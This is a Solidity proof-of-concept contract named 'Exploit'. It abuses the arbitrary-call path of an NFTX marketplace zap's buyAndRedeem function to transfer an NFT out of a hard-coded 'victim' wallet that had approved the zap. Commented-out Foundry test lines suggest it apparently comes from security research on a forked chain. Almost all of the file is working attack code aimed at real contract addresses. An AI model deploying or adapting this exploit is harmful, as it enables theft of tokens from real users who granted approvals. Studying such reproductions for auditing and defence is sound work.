// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./token/IERC721Upgradeable.sol";
import "./token/IERC20Upgradeable.sol";
import "./NFTXMarketplace0xZap.sol";
import "./token/ERC721SafeHolderUpgradeable.sol";


contract Exploit is ERC721SafeHolderUpgradeable {

    receive() external payable {}
    
    function exploit_buyAndRedeem() public {
        //  vm.prank(0xA9e1F9C1ec6eCb103C260c3eda0fA28e2785C57a); // random nftx vault token holder
        //  console.log(address(this));

        //  IERC20Upgradeable(0x0CB8af226d28116f01C85324B0d920A6128178FB).transfer(address(0xbbc53022Af15Bb973AD906577c84784c47C14371),10e18);
         address target = 0xbCe3781ae7Ca1a5e050Bd9C4c77369867eBc307e; // target token
         address victim = 0x4ffe2F674C4aFa078554cB2E5a6a672452B6c290; // a random user who approves to nftxzap
         bytes memory data = abi.encodeWithSelector(
             IERC721Upgradeable.transferFrom.selector,
             victim,
             address(this),
             8160 // target token id
         );
         // assertEq(
         //     IERC721(target).balanceOf(address(this)) == 0,
         //     true,
         //     "zero balance"
         // );

         uint256[] memory tokenIds;
         NFTXMarketplace0xZap(payable(0xbbc53022Af15Bb973AD906577c84784c47C14371)).buyAndRedeem{value: 100}(
             399,
             1,
             tokenIds,
             address(this),
             payable(target),
             data,
             payable(address(this))
         );

        //  assertEq(
        //      IERC721(target).ownerOf(1170),
        //      address(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84)
        // );
    }
}